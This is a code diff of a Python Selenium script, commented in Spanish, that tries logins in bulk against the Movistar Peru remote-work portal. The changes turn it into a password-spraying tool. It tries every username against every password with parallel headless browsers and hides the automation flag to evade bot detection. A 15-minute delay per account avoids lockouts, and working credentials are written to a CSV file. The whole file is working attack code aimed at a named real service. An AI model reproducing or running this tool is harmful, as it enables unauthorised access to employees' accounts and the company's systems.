@@ -10,16 +10,17 @@ from tqdm import tqdm
 from colorama import Fore, Style, init
 import os
 import logging
-from datetime import datetime
+from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
+from collections import defaultdict
 
-# Configurar logging
+# Configurar logging completo
 logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s',
+    level=logging.DEBUG,
+    format='%(asctime)s - [%(threadName)s] - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler('login_results.log'),
+        logging.FileHandler('log.txt', encoding='utf-8'),
         logging.StreamHandler()
     ]
 )
@@ -31,135 +32,128 @@ init(autoreset=True)
 # URL del login
 URL = "https://teletrabajo.movistar.pe"
 
-# Lock para escritura segura
+# Locks para escritura segura
 file_lock = threading.Lock()
-progress_lock = threading.Lock()
+tiempo_lock = threading.Lock()
 
-def cargar_credenciales_csv():
-    """Cargar credenciales desde el archivo CSV"""
+# Diccionario para rastrear último uso de cada usuario (con lock)
+ultimo_uso_usuario = defaultdict(lambda: datetime.min)
+
+def log_info(mensaje):
+    """Log con info"""
+    logger.info(mensaje)
+    print(Fore.CYAN + mensaje)
+
+def log_success(mensaje):
+    """Log de éxito"""
+    logger.info(mensaje)
+    print(Fore.GREEN + mensaje)
+
+def log_error(mensaje):
+    """Log de error"""
+    logger.error(mensaje)
+    print(Fore.RED + mensaje)
+
+def log_warning(mensaje):
+    """Log de advertencia"""
+    logger.warning(mensaje)
+    print(Fore.YELLOW + mensaje)
+
+def cargar_csv(archivo, nombre_tipo):
+    """Cargar CSV con múltiples codificaciones y separadores"""
     try:
-        if os.path.exists("credenciales.csv"):
-            # Intentar con múltiples codificaciones y separadores
-            encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252', 'windows-1252']
-            separadores = [',', ';', '\t', '|']
-            df = None
-            encoding_usado = None
-            separador_usado = None
-            
-            for encoding in encodings:
-                for sep in separadores:
-                    try:
-                        df = pd.read_csv("credenciales.csv", encoding=encoding, sep=sep)
-                        # Verificar que tenga al menos 2 columnas
-                        if len(df.columns) >= 2:
-                            encoding_usado = encoding
-                            separador_usado = sep
-                            break
-                    except:
-                        continue
-                if df is not None and len(df.columns) >= 2:
-                    break
-            
-            if df is None or len(df.columns) < 2:
-                print("❌ No se pudo leer el archivo correctamente")
-                print("💡 Verifica que el archivo tenga al menos 2 columnas")
-                print("💡 Formatos aceptados: CSV con coma (,) punto y coma (;) o tabulación")
-                return None
-            
-            sep_nombre = {',' : 'coma', ';': 'punto y coma', '\t': 'tabulación', '|': 'pipe'}
-            print(f"✅ Archivo leído con codificación: {encoding_usado} y separador: {sep_nombre.get(separador_usado, separador_usado)}")
-            logger.info(f"CSV leído - Encoding: {encoding_usado}, Separador: {separador_usado}")
-            
-            # Mostrar columnas encontradas
-            print(f"📋 Columnas encontradas en el CSV: {df.columns.tolist()}")
-            logger.info(f"Columnas del CSV: {df.columns.tolist()}")
-            
-            # Verificar que el CSV tenga las columnas necesarias
-            columnas_lower = [col.lower().strip() for col in df.columns]
-            
-            # Buscar columnas de usuario y password con nombres variados
-            col_usuario = None
-            col_password = None
-            
-            for i, col in enumerate(df.columns):
-                col_lower = col.lower().strip()
-                # Detectar columna de usuario
-                if col_lower in ['usuario', 'user', 'username', 'login', 'correo', 'email']:
-                    col_usuario = col
-                # Detectar columna de password
-                if col_lower in ['password', 'pass', 'contraseña', 'contrasena', 'clave', 'pwd']:
-                    col_password = col
-            
-            # Si no se encontraron, usar las primeras dos columnas
-            if col_usuario is None or col_password is None:
-                if len(df.columns) >= 2:
-                    col_usuario = df.columns[0]
-                    col_password = df.columns[1]
-                    print(f"⚠️ Usando primera columna como usuario: '{col_usuario}'")
-                    print(f"⚠️ Usando segunda columna como password: '{col_password}'")
-                    logger.warning(f"Columnas auto-asignadas: {col_usuario}, {col_password}")
-                else:
-                    print("❌ El CSV debe tener al menos 2 columnas")
-                    print(f"   Columnas actuales: {df.columns.tolist()}")
-                    return None
-            
-            # Renombrar columnas
-            df = df.rename(columns={col_usuario: 'usuario', col_password: 'password'})
-            
-            # Limpiar espacios en blanco
-            df['usuario'] = df['usuario'].astype(str).str.strip()
-            df['password'] = df['password'].astype(str).str.strip()
-            
-            # Eliminar filas vacías
-            df = df.dropna(subset=['usuario', 'password'])
-            
-            print(f"✅ Cargadas {len(df)} credenciales del archivo 'credenciales.csv'")
-            logger.info(f"Credenciales cargadas: {len(df)}")
-            return df
-        else:
-            print("❌ No se encontró el archivo 'credenciales.csv'")
-            print("📝 Crea un archivo CSV con el formato:")
-            print("usuario,password")
-            print("user1,pass1")
-            print("user2,pass2")
+        if not os.path.exists(archivo):
+            log_error(f"❌ No se encontró el archivo '{archivo}'")
             return None
+        
+        encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252', 'windows-1252']
+        separadores = [',', ';', '\t', '|']
+        df = None
+        encoding_usado = None
+        separador_usado = None
+        
+        for encoding in encodings:
+            for sep in separadores:
+                try:
+                    df = pd.read_csv(archivo, encoding=encoding, sep=sep)
+                    if len(df.columns) >= 1:
+                        encoding_usado = encoding
+                        separador_usado = sep
+                        break
+                except:
+                    continue
+            if df is not None and len(df.columns) >= 1:
+                break
+        
+        if df is None:
+            log_error(f"❌ No se pudo leer '{archivo}'")
+            return None
+        
+        sep_nombre = {',': 'coma', ';': 'punto y coma', '\t': 'tabulación', '|': 'pipe'}
+        log_info(f"✅ '{archivo}' leído - Encoding: {encoding_usado}, Separador: {sep_nombre.get(separador_usado, separador_usado)}")
+        log_info(f"📋 Columnas encontradas: {df.columns.tolist()}")
+        
+        # Tomar la primera columna
+        primera_col = df.columns[0]
+        df = df.rename(columns={primera_col: nombre_tipo})
+        
+        # Limpiar datos
+        df[nombre_tipo] = df[nombre_tipo].astype(str).str.strip()
+        df = df.dropna(subset=[nombre_tipo])
+        
+        log_success(f"✅ Cargados {len(df)} {nombre_tipo}s desde '{archivo}'")
+        return df
+        
     except Exception as e:
-        print(f"❌ Error al cargar credenciales: {e}")
-        logger.error(f"Error cargando credenciales: {e}")
+        log_error(f"❌ Error al cargar '{archivo}': {e}")
         return None
 
+def cargar_datos():
+    """Cargar usuarios y contraseñas"""
+    log_info("\n" + "="*70)
+    log_info("📂 CARGANDO ARCHIVOS CSV")
+    log_info("="*70)
+    
+    usuarios_df = cargar_csv("credenciales.csv", "usuario")
+    passwords_df = cargar_csv("contraseña.csv", "password")
+    
+    if usuarios_df is None or passwords_df is None:
+        log_error("❌ Error: No se pudieron cargar los archivos necesarios")
+        log_info("\n📝 Asegúrate de tener:")
+        log_info("   - credenciales.csv (lista de usuarios)")
+        log_info("   - contraseña.csv (lista de contraseñas)")
+        return None, None
+    
+    return usuarios_df, passwords_df
+
 def configurar_driver():
-    """Configurar el navegador Chrome con opciones optimizadas para velocidad"""
+    """Configurar navegador Chrome optimizado"""
     options = webdriver.ChromeOptions()
     
-    # Modo headless (sin ventana visible) - MÁS RÁPIDO
+    # Modo headless
     options.add_argument("--headless=new")
     options.add_argument("--disable-gpu")
     
-    # Optimizaciones de rendimiento
+    # Optimizaciones
     options.add_argument("--start-maximized")
     options.add_argument("--disable-blink-features=AutomationControlled")
     options.add_argument("--disable-extensions")
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
     
-    # Deshabilitar imágenes y CSS para cargar más rápido
+    # Deshabilitar recursos innecesarios
     prefs = {
-        "profile.managed_default_content_settings.images": 2,  # No cargar imágenes
-        "profile.managed_default_content_settings.stylesheets": 2,  # No cargar CSS
-        "profile.default_content_setting_values.notifications": 2,  # Deshabilitar notificaciones
-        "disk-cache-size": 4096  # Cache pequeño
+        "profile.managed_default_content_settings.images": 2,
+        "profile.managed_default_content_settings.stylesheets": 2,
+        "profile.default_content_setting_values.notifications": 2,
+        "disk-cache-size": 4096
     }
     options.add_experimental_option("prefs", prefs)
-    
-    # Más optimizaciones
     options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
     options.add_experimental_option('useAutomationExtension', False)
     options.add_argument("--disable-logging")
     options.add_argument("--log-level=3")
     options.add_argument("--silent")
-    
-    # Deshabilitar carga de recursos innecesarios
     options.add_argument("--blink-settings=imagesEnabled=false")
     options.add_argument("--disable-remote-fonts")
     
@@ -169,306 +163,354 @@ def configurar_driver():
             options=options
         )
         driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-        logger.info("✅ Navegador configurado exitosamente (modo optimizado)")
         return driver
     except Exception as e:
-        logger.error(f"Error al configurar el navegador: {e}")
+        log_error(f"Error configurando navegador: {e}")
         return None
 
-def intentar_login(driver, wait, usuario, password):
-    """Intentar login con las credenciales proporcionadas"""
-    try:
-        logger.info(f"🚀 Intentando login para: {usuario}")
+def esperar_tiempo_minimo(usuario):
+    """Esperar 15 minutos desde el último uso del usuario"""
+    with tiempo_lock:
+        ahora = datetime.now()
+        ultimo_uso = ultimo_uso_usuario[usuario]
+        tiempo_transcurrido = (ahora - ultimo_uso).total_seconds()
+        tiempo_espera = 900  # 15 minutos en segundos
         
-        # Cargar la página
+        if tiempo_transcurrido < tiempo_espera:
+            tiempo_restante = tiempo_espera - tiempo_transcurrido
+            log_warning(f"⏳ Usuario '{usuario}' usado hace {int(tiempo_transcurrido/60)} min. Esperando {int(tiempo_restante/60)} min más...")
+            time.sleep(tiempo_restante)
+        
+        # Actualizar último uso
+        ultimo_uso_usuario[usuario] = datetime.now()
+        log_info(f"✓ Usuario '{usuario}' listo para usar")
+
+def intentar_login(driver, wait, usuario, password):
+    """Intentar login y verificar resultado"""
+    try:
+        log_info(f"🚀 Iniciando login: Usuario='{usuario}' | Password='{password}'")
+        
+        # Cargar página
         driver.get(URL)
+        log_info(f"🌐 Página cargada: {URL}")
         time.sleep(2)
         
-        # Esperar y encontrar campo de usuario
-        logger.info("👤 Ingresando usuario...")
-        input_user = wait.until(
-            EC.presence_of_element_located((By.XPATH, '//*[@id="login"]'))
-        )
+        # Ingresar usuario
+        log_info("👤 Localizando campo de usuario...")
+        input_user = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="login"]')))
         input_user.clear()
         input_user.send_keys(usuario)
+        log_info(f"✓ Usuario ingresado: {usuario}")
         time.sleep(0.5)
         
-        # Encontrar campo de contraseña
-        logger.info("🔒 Ingresando contraseña...")
-        input_pass = wait.until(
-            EC.presence_of_element_located((By.XPATH, '//*[@id="passwd"]'))
-        )
+        # Ingresar contraseña
+        log_info("🔒 Localizando campo de contraseña...")
+        input_pass = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="passwd"]')))
         input_pass.clear()
         input_pass.send_keys(password)
+        log_info(f"✓ Contraseña ingresada: {password}")
         time.sleep(0.5)
         
-        # Hacer clic en el botón de login
-        logger.info("🔘 Haciendo clic en botón de login...")
-        boton_login = wait.until(
-            EC.element_to_be_clickable((By.XPATH, '//*[@id="nsg-x1-logon-button"]'))
-        )
+        # Click en botón login
+        log_info("🔘 Buscando botón de login...")
+        boton_login = wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="nsg-x1-logon-button"]')))
         boton_login.click()
+        log_info("✓ Click en botón de login ejecutado")
         
-        # Esperar a que la página procese el login
-        time.sleep(3)
+        # Esperar 4 segundos para verificar mensaje de error
+        log_info("⏱️ Esperando 4 segundos para verificar resultado...")
+        time.sleep(4)
         
-        # Verificar el resultado del login
-        resultado = verificar_resultado_login(driver, wait)
+        # Verificar mensaje de error específico
+        try:
+            error_element = driver.find_element(By.XPATH, '//*[@id="explicit-auth-screen"]/div[3]/div/div[2]/div[2]/div[3]/div[1]/form/div[6]/div/p/span')
+            if error_element and error_element.is_displayed():
+                error_text = error_element.text.strip()
+                log_error(f"❌ Mensaje de error detectado: '{error_text}'")
+                
+                if "Contraseña incorrecta" in error_text or "incorrecta" in error_text.lower():
+                    log_error(f"❌ LOGIN INCORRECTO: Usuario='{usuario}' | Password='{password}' | Razón: Contraseña incorrecta")
+                    return "INCORRECTO"
+        except:
+            # No se encontró el mensaje de error
+            log_info("✓ No se detectó mensaje de error de contraseña")
         
-        if resultado:
-            logger.info(f"✅ LOGIN EXITOSO: {usuario}")
-            return True
-        else:
-            logger.info(f"❌ LOGIN FALLIDO: {usuario}")
-            return False
-            
-    except Exception as e:
-        logger.error(f"❌ Error en login para {usuario}: {e}")
-        return False
-
-def verificar_resultado_login(driver, wait):
-    """Verificar si el login fue exitoso"""
-    try:
-        time.sleep(2)
-        url_actual = driver.current_url.lower()
-        
-        # Verificar mensajes de error comunes
+        # Verificar otros mensajes de error
         mensajes_error = [
             "//div[contains(@class, 'error')]",
             "//span[contains(@class, 'error')]",
             "//p[contains(@class, 'error')]",
-            "//div[contains(text(), 'incorrecta')]",
-            "//div[contains(text(), 'inválido')]",
-            "//div[contains(text(), 'error')]",
-            "//*[contains(text(), 'usuario o contraseña')]",
-            "//*[contains(text(), 'credenciales incorrectas')]"
+            "//*[contains(text(), 'incorrecta')]",
+            "//*[contains(text(), 'inválido')]",
+            "//*[contains(text(), 'error')]"
         ]
         
         for selector in mensajes_error:
             try:
-                elemento_error = driver.find_elements(By.XPATH, selector)
-                if elemento_error and any(e.is_displayed() for e in elemento_error):
-                    logger.info("🚫 Mensaje de error detectado en pantalla")
-                    return False
+                elementos = driver.find_elements(By.XPATH, selector)
+                if elementos and any(e.is_displayed() for e in elementos):
+                    error_text = elementos[0].text.strip()
+                    log_error(f"❌ Error genérico detectado: '{error_text}'")
+                    log_error(f"❌ LOGIN INCORRECTO: Usuario='{usuario}' | Password='{password}'")
+                    return "INCORRECTO"
             except:
                 continue
         
-        # Verificar si seguimos en la página de login
-        if "login" in url_actual or driver.current_url == URL:
-            logger.info("⚠️ Aún en página de login")
-            return False
+        # Verificar URL
+        url_actual = driver.current_url
+        log_info(f"🔍 URL actual después del login: {url_actual}")
         
-        # Verificar si hay elementos que indiquen login exitoso
+        # Si no hay errores y la URL cambió, es exitoso
+        if url_actual != URL and "login" not in url_actual.lower():
+            log_success(f"✅ LOGIN EXITOSO: Usuario='{usuario}' | Password='{password}' | Nueva URL: {url_actual}")
+            return "EXITOSO"
+        
+        # Verificar ventanas/pestañas nuevas
+        if len(driver.window_handles) > 1:
+            log_success(f"✅ LOGIN EXITOSO: Usuario='{usuario}' | Password='{password}' | Nueva pestaña detectada")
+            return "EXITOSO"
+        
+        # Verificar elementos de sesión iniciada
         indicadores_exito = [
-            "//div[contains(@class, 'dashboard')]",
-            "//div[contains(@class, 'home')]",
             "//a[contains(text(), 'Cerrar sesión')]",
             "//a[contains(text(), 'Logout')]",
-            "//button[contains(text(), 'Salir')]"
+            "//button[contains(text(), 'Salir')]",
+            "//*[contains(text(), 'cambiar contraseña')]",
+            "//*[contains(text(), 'change password')]"
         ]
         
         for selector in indicadores_exito:
             try:
                 elementos = driver.find_elements(By.XPATH, selector)
                 if elementos and any(e.is_displayed() for e in elementos):
-                    logger.info("✅ Indicador de login exitoso detectado")
-                    return True
+                    log_success(f"✅ LOGIN EXITOSO: Usuario='{usuario}' | Password='{password}' | Indicador de sesión detectado")
+                    return "EXITOSO"
             except:
                 continue
         
-        # Si la URL cambió y no hay errores, considerarlo exitoso
-        if driver.current_url != URL and "login" not in url_actual:
-            logger.info("✅ URL cambió, considerando login exitoso")
-            return True
-        
-        logger.info("❓ Estado incierto del login")
-        return False
+        # Si no se detectó nada claro después de 4 segundos, considerar exitoso
+        log_success(f"✅ LOGIN EXITOSO (sin error detectado): Usuario='{usuario}' | Password='{password}'")
+        return "EXITOSO"
         
     except Exception as e:
-        logger.error(f"Error verificando resultado: {e}")
-        return False
+        log_error(f"❌ Error en proceso de login: Usuario='{usuario}' | Error: {e}")
+        return "ERROR"
 
-def guardar_credencial_exitosa(usuario, password):
-    """Guardar credencial exitosa inmediatamente (thread-safe)"""
+def guardar_resultado(usuario, password, resultado):
+    """Guardar resultado en CSV correspondiente"""
     try:
         with file_lock:
             fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            archivo = "credenciales_exitosas.csv"
             
-            # Verificar si el archivo existe
+            if resultado == "EXITOSO":
+                archivo = "loginExitoso.csv"
+            else:
+                archivo = "loginIncorrecto.csv"
+            
             existe = os.path.exists(archivo)
             
-            # Crear DataFrame con la nueva credencial
             df_nueva = pd.DataFrame([{
                 'usuario': usuario,
                 'password': password,
+                'resultado': resultado,
                 'fecha_hora': fecha_hora
             }])
             
-            # Guardar (append si existe, crear si no)
             if existe:
                 df_nueva.to_csv(archivo, mode='a', header=False, index=False, encoding='utf-8')
             else:
                 df_nueva.to_csv(archivo, mode='w', header=True, index=False, encoding='utf-8')
             
-            logger.info(f"💾 Credencial guardada: {usuario}")
+            log_info(f"💾 Resultado guardado en '{archivo}': {usuario}")
             
     except Exception as e:
-        logger.error(f"Error guardando credencial {usuario}: {e}")
+        log_error(f"Error guardando resultado: {e}")
 
-def guardar_checkpoint(indice, total):
-    """Guardar progreso actual"""
+def guardar_checkpoint(indice_usuario, indice_password):
+    """Guardar checkpoint del progreso"""
     try:
         with open("checkpoint.txt", "w") as f:
-            f.write(f"{indice},{total}")
-    except:
-        pass
+            f.write(f"{indice_usuario},{indice_password}")
+        log_info(f"💾 Checkpoint guardado: Usuario #{indice_usuario}, Password #{indice_password}")
+    except Exception as e:
+        log_error(f"Error guardando checkpoint: {e}")
 
 def cargar_checkpoint():
-    """Cargar progreso guardado"""
+    """Cargar checkpoint previo"""
     try:
         if os.path.exists("checkpoint.txt"):
             with open("checkpoint.txt", "r") as f:
                 contenido = f.read().strip()
                 if contenido:
-                    indice, total = map(int, contenido.split(','))
-                    return indice
-    except:
-        pass
-    return 0
+                    idx_usuario, idx_password = map(int, contenido.split(','))
+                    log_info(f"📂 Checkpoint cargado: Usuario #{idx_usuario}, Password #{idx_password}")
+                    return idx_usuario, idx_password
+    except Exception as e:
+        log_warning(f"No se pudo cargar checkpoint: {e}")
+    return 0, 0
 
-def procesar_credencial_thread(args):
-    """Función para procesar una credencial en un thread"""
-    idx, usuario, password, checkpoint_cada = args
+def procesar_combinacion(args):
+    """Procesar una combinación usuario-password"""
+    idx_usuario, idx_password, usuario, password, total_usuarios, total_passwords = args
     
     driver = None
     try:
-        # Crear driver para este thread
+        log_info(f"\n{'='*70}")
+        log_info(f"🔄 PROCESANDO COMBINACIÓN #{idx_usuario * total_passwords + idx_password + 1}")
+        log_info(f"   Usuario: {usuario} (#{idx_usuario + 1}/{total_usuarios})")
+        log_info(f"   Password: {password} (#{idx_password + 1}/{total_passwords})")
+        log_info(f"{'='*70}")
+        
+        # Esperar tiempo mínimo entre usos del mismo usuario
+        esperar_tiempo_minimo(usuario)
+        
+        # Crear driver
+        log_info("🔧 Configurando navegador...")
         driver = configurar_driver()
         if driver is None:
-            return (idx, usuario, False)
+            log_error("❌ No se pudo configurar el navegador")
+            return (idx_usuario, idx_password, usuario, password, "ERROR")
         
         wait = WebDriverWait(driver, 15)
         
         # Intentar login
         resultado = intentar_login(driver, wait, usuario, password)
         
-        if resultado:
-            # Guardar inmediatamente si es exitoso
-            guardar_credencial_exitosa(usuario, password)
+        # Guardar resultado
+        guardar_resultado(usuario, password, resultado)
         
-        # Guardar checkpoint cada N usuarios
-        if idx % checkpoint_cada == 0:
-            guardar_checkpoint(idx, checkpoint_cada)
+        # Guardar checkpoint cada 10 combinaciones
+        if (idx_usuario * total_passwords + idx_password) % 10 == 0:
+            guardar_checkpoint(idx_usuario, idx_password)
         
-        return (idx, usuario, resultado)
+        return (idx_usuario, idx_password, usuario, password, resultado)
         
     except Exception as e:
-        logger.error(f"Error procesando {usuario}: {e}")
-        return (idx, usuario, False)
+        log_error(f"❌ Error procesando: Usuario='{usuario}', Password='{password}' | Error: {e}")
+        return (idx_usuario, idx_password, usuario, password, "ERROR")
     finally:
         if driver:
             try:
                 driver.quit()
+                log_info("🔒 Navegador cerrado")
             except:
                 pass
 
 def main():
-    """Función principal del programa"""
-    print(Fore.CYAN + "="*70)
-    print(Fore.CYAN + "🚀 VALIDADOR DE CREDENCIALES - TELETRABAJO MOVISTAR PERÚ")
-    print(Fore.CYAN + "⚡ MODO OPTIMIZADO: Multi-threading + Headless + Sin CSS/imágenes")
-    print(Fore.CYAN + "="*70)
+    """Función principal"""
+    log_info("="*70)
+    log_info("🚀 VALIDADOR MASIVO DE CREDENCIALES - TELETRABAJO MOVISTAR")
+    log_info("⚡ Modo: Multi-threading con rotación de usuarios")
+    log_info("="*70)
+    log_info(f"📅 Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     
-    # Cargar credenciales
-    credenciales = cargar_credenciales_csv()
-    if credenciales is None or len(credenciales) == 0:
+    # Cargar datos
+    usuarios_df, passwords_df = cargar_datos()
+    if usuarios_df is None or passwords_df is None:
         return
     
-    # Configuración de threads
-    NUM_THREADS = int(input("\n🔧 ¿Cuántos navegadores quieres usar en paralelo? (recomendado 3-5): ") or "3")
-    CHECKPOINT_CADA = 100
+    usuarios = usuarios_df['usuario'].tolist()
+    passwords = passwords_df['password'].tolist()
     
-    print(f"\n📊 Total de credenciales a probar: {len(credenciales)}")
-    print(f"🔀 Usando {NUM_THREADS} navegadores en paralelo")
-    print(f"💾 Guardando checkpoint cada {CHECKPOINT_CADA} usuarios")
+    total_usuarios = len(usuarios)
+    total_passwords = len(passwords)
+    total_combinaciones = total_usuarios * total_passwords
     
-    # Verificar si hay checkpoint previo
-    inicio = cargar_checkpoint()
-    if inicio > 0:
-        respuesta = input(f"\n⚠️ Se encontró progreso previo en índice {inicio}. ¿Continuar desde ahí? (s/n): ")
+    log_info(f"\n📊 ESTADÍSTICAS:")
+    log_info(f"   👥 Usuarios: {total_usuarios:,}")
+    log_info(f"   🔑 Contraseñas: {total_passwords}")
+    log_info(f"   🔢 Total combinaciones: {total_combinaciones:,}")
+    log_info(f"   ⏱️ Tiempo mínimo entre usos del mismo usuario: 15 minutos")
+    
+    # Configuración
+    NUM_THREADS = int(input("\n🔧 ¿Cuántos navegadores en paralelo? (recomendado 3-5): ") or "3")
+    log_info(f"🔀 Configurado para usar {NUM_THREADS} navegadores en paralelo")
+    
+    # Cargar checkpoint
+    inicio_usuario, inicio_password = cargar_checkpoint()
+    if inicio_usuario > 0 or inicio_password > 0:
+        respuesta = input(f"\n⚠️ Checkpoint encontrado (Usuario #{inicio_usuario}, Password #{inicio_password}). ¿Continuar? (s/n): ")
         if respuesta.lower() != 's':
-            inicio = 0
+            inicio_usuario, inicio_password = 0, 0
     
-    if inicio > 0:
-        credenciales = credenciales.iloc[inicio:]
-        print(f"▶️ Continuando desde índice {inicio}")
+    # Preparar tareas
+    log_info("\n🎯 Preparando combinaciones...")
+    tareas = []
     
-    usuarios_exitosos = []
-    usuarios_fallidos = []
+    for idx_u, usuario in enumerate(usuarios):
+        if idx_u < inicio_usuario:
+            continue
+        
+        for idx_p, password in enumerate(passwords):
+            if idx_u == inicio_usuario and idx_p < inicio_password:
+                continue
+            
+            tareas.append((idx_u, idx_p, usuario, password, total_usuarios, total_passwords))
+    
+    log_info(f"✅ {len(tareas):,} combinaciones preparadas para procesar")
+    
+    # Estadísticas
+    exitosos = 0
+    incorrectos = 0
+    errores = 0
     
     try:
-        # Preparar argumentos para los threads
-        tareas = [
-            (idx + inicio, row['usuario'], row['password'], CHECKPOINT_CADA)
-            for idx, (_, row) in enumerate(credenciales.iterrows())
-        ]
+        log_info(f"\n🏁 INICIANDO PROCESAMIENTO PARALELO")
+        log_info(f"⏱️ Tiempo estimado: ~{(len(tareas) * 8) / NUM_THREADS / 3600:.1f} horas\n")
         
-        print(f"\n🏁 Iniciando procesamiento paralelo...")
-        print(f"⏱️ Tiempo estimado: ~{(len(tareas) * 8) / NUM_THREADS / 3600:.1f} horas\n")
-        
-        # Procesar con ThreadPoolExecutor
         with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
-            # Enviar todas las tareas
-            futures = {executor.submit(procesar_credencial_thread, tarea): tarea for tarea in tareas}
+            futures = {executor.submit(procesar_combinacion, tarea): tarea for tarea in tareas}
             
-            # Procesar resultados con barra de progreso
-            with tqdm(total=len(tareas), desc="🔄 Procesando", unit="usuarios") as pbar:
+            with tqdm(total=len(tareas), desc="🔄 Progreso", unit="comb") as pbar:
                 for future in as_completed(futures):
                     try:
-                        idx, usuario, resultado = future.result()
+                        idx_u, idx_p, usuario, password, resultado = future.result()
                         
-                        if resultado:
-                            usuarios_exitosos.append(usuario)
-                            tqdm.write(Fore.GREEN + f"✅ [{idx}] LOGIN EXITOSO: {usuario}")
+                        if resultado == "EXITOSO":
+                            exitosos += 1
+                            tqdm.write(Fore.GREEN + f"✅ EXITOSO: {usuario} | {password}")
+                        elif resultado == "INCORRECTO":
+                            incorrectos += 1
                         else:
-                            usuarios_fallidos.append(usuario)
-                            
+                            errores += 1
+                        
                         pbar.update(1)
+                        pbar.set_postfix({
+                            'Exitosos': exitosos,
+                            'Incorrectos': incorrectos,
+                            'Errores': errores
+                        })
                         
                     except Exception as e:
-                        logger.error(f"Error obteniendo resultado: {e}")
+                        log_error(f"Error obteniendo resultado: {e}")
                         pbar.update(1)
         
-        # Mostrar resumen final
-        print("\n" + "="*70)
-        print("📊 RESUMEN FINAL DE RESULTADOS")
-        print("="*70)
-        print(f"Total procesadas: {len(credenciales)}")
-        print(f"✅ Exitosas: {len(usuarios_exitosos)}")
-        print(f"❌ Fallidas: {len(usuarios_fallidos)}")
-        print(f"📈 Tasa de éxito: {(len(usuarios_exitosos)/len(credenciales)*100):.2f}%")
-        
-        if usuarios_exitosos:
-            print(f"\n💾 Credenciales exitosas guardadas en: credenciales_exitosas.csv")
-            print(f"📝 Total de credenciales válidas: {len(usuarios_exitosos)}")
-        else:
-            print("\n❌ No se encontraron credenciales válidas")
+        # Resumen final
+        log_info("\n" + "="*70)
+        log_info("📊 RESUMEN FINAL")
+        log_info("="*70)
+        log_info(f"✅ Exitosos: {exitosos}")
+        log_info(f"❌ Incorrectos: {incorrectos}")
+        log_info(f"⚠️ Errores: {errores}")
+        log_info(f"📈 Total procesado: {exitosos + incorrectos + errores}")
+        log_info(f"📁 Resultados guardados en:")
+        log_info(f"   - loginExitoso.csv")
+        log_info(f"   - loginIncorrecto.csv")
+        log_info(f"   - log.txt")
+        log_info(f"📅 Finalizado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         
         # Limpiar checkpoint
         if os.path.exists("checkpoint.txt"):
             os.remove("checkpoint.txt")
             
     except KeyboardInterrupt:
-        print(Fore.YELLOW + "\n⚠️ Programa interrumpido por el usuario")
-        print(f"💾 Progreso guardado. Puedes reanudar ejecutando el script nuevamente")
-        logger.warning("Programa interrumpido por el usuario")
+        log_warning("\n⚠️ PROGRAMA INTERRUMPIDO POR EL USUARIO")
+        log_info("💾 Progreso guardado en checkpoint.txt")
+        log_info("▶️ Ejecuta nuevamente para continuar")
     except Exception as e:
-        print(Fore.RED + f"\n❌ Error general: {e}")
-        logger.error(f"Error general: {e}")
+        log_error(f"\n❌ ERROR CRÍTICO: {e}")
     finally:
-        print("\n✅ Programa finalizado")
-        logger.info("Programa finalizado")
+        log_info("\n✅ PROGRAMA FINALIZADO")
 
 if __name__ == "__main__":
     main()
